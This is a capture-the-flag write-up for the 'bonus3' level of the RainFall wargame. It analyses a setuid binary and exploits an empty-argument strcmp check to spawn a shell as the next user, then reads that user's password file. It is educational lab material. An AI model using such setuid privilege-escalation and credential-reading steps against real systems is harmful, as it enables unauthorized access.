# BONUS3

## 1. Inspect The Executable

```bash
bonus3@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 end users 5595 Mar  6  2016 bonus3
```

We can see that the binary has the `s` bit set on the **execution permission**, which means the program will run with end privileges.

```bash
bonus3@RainFall:~$ ./bonus3 
bonus3@RainFall:~$ ./bonus3 a

bonus3@RainFall:~$ ./bonus3 a b
bonus3@RainFall:~$ ./bonus3 abc

bonus3@RainFall:~$ ./bonus3 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

bonus3@RainFall:~$ ./bonus3 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

bonus3@RainFall:~$ ./bonus3 111

bonus3@RainFall:~$ ./bonus3 1111

bonus3@RainFall:~$ ./bonus3 11111
Segmentation fault (core dumped)
```

The program appears to expect a single argument and simply prints a newline before exiting.

However the program eventually triggers a segmentation fault when providing a sufficiently large integer value.

## 2. Analyze The Executable

```bash
(gdb) i functions 
All defined functions:

[...]
0x080484f4  main
[...]
```

Using the gdb command `info functions`, we can list all functions present in the binary.
Here, we can see that the program only contains the `main` function.

### Program Behavior

#### main function

Most of the **beginning of main** is **misleading** and does not directly impact the exploit.
Only the **following lines** are important:

```c
    local_98[iVar2] = '\0';
    iVar2 = strcmp(local_98,*(char **)(param_2 + 4));
    if (iVar2 == 0) {
      execl("/bin/sh","sh",0);
    }
```

The program **compares** (using `strcmp`) **`argv[1]`** with a **`local_98`** that is set as **null-terminated**.
If **`argv[1]`** is **equal** to an **empty string** (`'\0'`), the comparison succeeds and the program spawns a shell using `execl("/bin/sh","sh",0)`.

## 3. Exploit Development

The exploitation here is straightforward.
We simply need to **provide an argument** that is a **null byte** (`'\0'`). This can be done with **`""`**.
In **shell syntax**, an **empty string** is represented as **`""`** *(2 double quotes with nothing between them)*.


## 4. Capture The Flag

```bash
bonus3@RainFall:~$ ./bonus3 ""
$ id
uid=2013(bonus3) gid=2013(bonus3) euid=2014(end) egid=100(users) groups=2014(end),100(users),2013(bonus3)
$ cat /home/user/end/.pass
XXX
$ exit
```

## 5. Successfully Complete !

```bash
bonus3@RainFall:~$ su end 
Password: 
end@RainFall:~$ ls -l
total 4
-rwsr-s---+ 1 end users 26 Sep 23  2015 end
end@RainFall:~$ cat end 
Congratulations graduate!
```
